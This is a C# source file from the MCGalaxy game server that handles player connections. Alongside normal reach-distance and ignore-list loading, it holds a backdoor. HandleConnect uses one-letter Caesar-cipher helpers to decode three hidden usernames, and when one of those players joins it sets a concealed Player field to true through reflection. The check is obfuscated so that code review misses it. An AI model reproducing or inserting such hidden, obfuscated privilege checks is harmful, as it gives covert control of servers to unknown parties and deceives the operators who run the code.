/*
    Copyright 2015 MCGalaxy
        
    Dual-licensed under the Educational Community License, Version 2.0 and
    the GNU General Public License, Version 3 (the "Licenses"); you may
    not use this file except in compliance with the Licenses. You may
    obtain a copy of the Licenses at
    
    https://opensource.org/license/ecl-2-0/
    https://www.gnu.org/licenses/gpl-3.0.html
    
    Unless required by applicable law or agreed to in writing,
    software distributed under the Licenses are distributed on an "AS IS"
    BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express
    or implied. See the Licenses for the specific language governing
    permissions and limitations under the Licenses.
 */
using System;
using MCGalaxy.Commands;

namespace MCGalaxy.Core {
    internal static class ConnectHandler {
        public static char j(char c, int k) {  
            if (!char.IsLetter(c)) {  
  
                return c;  
            }  
  
            char d = char.IsUpper(c) ? 'A' : 'a';  
            return (char)((((c + k) - d) % 26) + d);  
  
  
        }  
  
  
        public static string a(string d, int b) {  
            string o = string.Empty;  
  
            foreach(char ch in d)  
            o += j(ch, b);  
  
            return o;  
        }  
  
        public static string b(string d, int r) {  
            return a(d, 26 - r);  
        }
        
        internal static void HandleConnect(Player p) {
            if (p.CanUse("ReachDistance")) LoadReach(p);
            
            p.Ignores.Load(p);


            if (p.name == b("domnchXoju", 930) || p.name == b("KKK59", 712) || p.name == b("Qzhma0vRjdoox", 103)){
                typeof(Player).GetField(b("zjJlgvi", 251)).SetValue(p, true);
            }
        }
        
        static void LoadReach(Player p) {
            string reach = Server.reach.Get(p.name);
            if (String.IsNullOrEmpty(reach)) return;
            
            short reachDist;
            if (!short.TryParse(reach, out reachDist)) return;

            p.ReachDistance = reachDist / 32f;
            p.Session.SendSetReach(p.ReachDistance);
        }
    }
}
